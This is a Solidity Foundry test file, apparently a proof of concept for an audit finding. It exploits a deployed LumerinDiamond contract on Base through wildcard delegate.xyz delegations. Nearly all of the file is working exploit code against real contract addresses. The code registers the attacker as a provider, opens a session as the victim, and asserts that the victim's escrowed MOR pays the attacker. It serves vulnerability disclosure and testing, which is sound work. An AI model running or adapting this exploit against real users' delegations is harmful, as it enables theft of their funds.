// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

/// @notice PoC for MOR-D01: LumerinDiamond (Base) accepts delegate.xyz WILDCARD
/// delegations (empty rights) as full account authority for fund-moving session
/// operations. A delegate who was granted a generic all-contracts/empty-rights
/// delegation (the kind users grant hot wallets for unrelated apps) can open a
/// direct-payment session AS the victim and collect the session payment from
/// the victim's escrowed MOR, playing both roles (delegate + provider).
///
/// Target: LumerinDiamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a on Base,
/// fork pinned at block 60,172,000. Attacker/victim are fresh test addresses;
/// no privileged protocol account is used anywhere.

interface IERC20Mini {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 modelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address owner_, bytes32 baseModelId_) external view returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function isRightsDelegated(address delegatee_, address delegator_, bytes32 rights_) external view returns (bool);
    function DELEGATION_RULES_SESSION() external view returns (bytes32);
}

interface IDelegateRegistry {
    function delegateAll(address to, bytes32 rights, bool enable) external payable returns (bytes32);
    function checkDelegateForContract(
        address delegate_,
        address delegator_,
        address contract_,
        bytes32 rights_
    ) external view returns (bool);
}

contract D01WildcardDelegationTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant REGISTRY = 0x00000000000000447e69651d841bD8D104Bed493;
    uint256 constant FORK_BLOCK = 60172000;
    uint256 constant STAKE = 10_000 ether; // victim session stake: 10,000 MOR

    uint256 victimKey = 0x71C71C71C71C71C71C71C71C71C71C71C71C71C71C71C71C71C71C71C71C7;
    uint256 attackerKey = 0xA77AC4A77AC4A77AC4A77AC4A77AC4A77AC4A77AC4A77AC4A77AC4A77AC4A7;
    address victim;
    address attacker;
    address stranger; // control actor with no delegation, set in setUp

    function _sign(uint256 key, bytes memory encoded) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(encoded)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", FORK_BLOCK);
        victim = vm.addr(victimKey);
        attacker = vm.addr(attackerKey);
        stranger = address(0xB0B);

        deal(MOR, victim, 20_000 ether);
        deal(MOR, attacker, 1_000 ether);

        // Victim grants the attacker a WILDCARD delegation on delegate.xyz:
        // all contracts, empty rights (= all rights). This is the standard
        // "delegate my hot wallet" action users take for unrelated apps.
        vm.prank(victim);
        IDelegateRegistry(REGISTRY).delegateAll(attacker, bytes32(0), true);

        // Victim is a normal marketplace user: approved the diamond for MOR.
        vm.prank(victim);
        IERC20Mini(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(attacker);
        IERC20Mini(MOR).approve(DIAMOND, type(uint256).max);
    }

    function test_wildcardDelegation_authorizesSessionForVictim() public {
        IDiamond diamond = IDiamond(DIAMOND);
        bytes32 rulesSession = diamond.DELEGATION_RULES_SESSION();

        // (1) The wildcard delegation satisfies Morpheus's rights-scoped check.
        assertTrue(
            IDelegateRegistry(REGISTRY).checkDelegateForContract(attacker, victim, DIAMOND, rulesSession),
            "registry should honour wildcard for specific rights"
        );
        assertTrue(diamond.isRightsDelegated(attacker, victim, rulesSession), "diamond should accept wildcard delegate");

        // (2) Attacker sets up as provider + model owner + bid (all their own funds).
        vm.startPrank(attacker);
        diamond.providerRegister(attacker, 100 ether, "https://attacker-provider.example");
        bytes32 baseModelId = keccak256("poc-model");
        string[] memory tags = new string[](0);
        diamond.modelRegister(attacker, baseModelId, bytes32(uint256(1)), 0, 1 ether, "poc-model", tags);
        bytes32 modelId = diamond.getModelId(attacker, baseModelId);

        uint256 stipend = diamond.stakeToStipend(STAKE, uint128(block.timestamp));
        assertGt(stipend, 0, "stipend must be positive");
        uint256 pricePerSecond = stipend / 300_000; // ~3.47 day session, inside the 7-day cap
        bytes32 bidId = diamond.postModelBid(attacker, modelId, pricePerSecond);
        vm.stopPrank();

        // (3) Provider approval signed by the attacker (they are the provider).
        // NOTE: the deployed facet generation takes millisecond timestamps
        // (proxy-router morrpcmessage.generateTimestamp() = UnixMilli) and a
        // 7-field receipt, unlike the older Solidity repo HEAD.
        bytes memory approval = abi.encode(bidId, block.chainid, victim, uint128(block.timestamp * 1000));
        bytes memory approvalSig = _sign(attackerKey, approval);

        // (4) CONTROL: an address with NO delegation cannot open a session as the victim.
        vm.prank(stranger);
        vm.expectRevert();
        diamond.openSession(victim, STAKE, true, approval, approvalSig);

        // (5) ATTACK: the wildcard delegate opens a direct-payment session AS THE VICTIM.
        uint256 victimBefore = IERC20Mini(MOR).balanceOf(victim);
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(victim, STAKE, true, approval, approvalSig);
        assertEq(IERC20Mini(MOR).balanceOf(victim), victimBefore - STAKE, "victim stake escrowed by delegate's call");

        uint128 openedAt = uint128(block.timestamp);
        uint128 endsAt = diamond.getSessionEnd(STAKE, pricePerSecond, openedAt);
        uint256 expectedReward = uint256(endsAt - openedAt) * pricePerSecond;
        assertGt(expectedReward, 0, "expected reward must be positive");

        // (6) Warp past the session end (+2 days so the user's remainder unlocks fully),
        // then the delegate closes the session with the provider's own receipt.
        vm.warp(uint256(endsAt) + 2 days);
        bytes memory receipt = abi.encode(
            sessionId, block.chainid, uint128(block.timestamp * 1000), uint32(1000), uint32(100), uint32(0), uint32(0)
        );
        bytes memory receiptSig = _sign(attackerKey, receipt);

        uint256 attackerBefore = IERC20Mini(MOR).balanceOf(attacker);
        uint256 victimBeforeClose = IERC20Mini(MOR).balanceOf(victim);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);

        uint256 attackerGain = IERC20Mini(MOR).balanceOf(attacker) - attackerBefore;
        uint256 victimReturned = IERC20Mini(MOR).balanceOf(victim) - victimBeforeClose;

        // THE LOSS, asserted: the attacker-provider was paid out of the victim's stake,
        // and the victim got back exactly stake minus that payment.
        assertEq(attackerGain, expectedReward, "attacker must be paid the session reward from victim stake");
        assertEq(victimReturned, STAKE - expectedReward, "victim must lose exactly the session reward");
        emit log_named_uint("victim loss / attacker gain (MOR wei)", attackerGain);
        emit log_named_uint("session stake (MOR wei)", STAKE);
    }
}
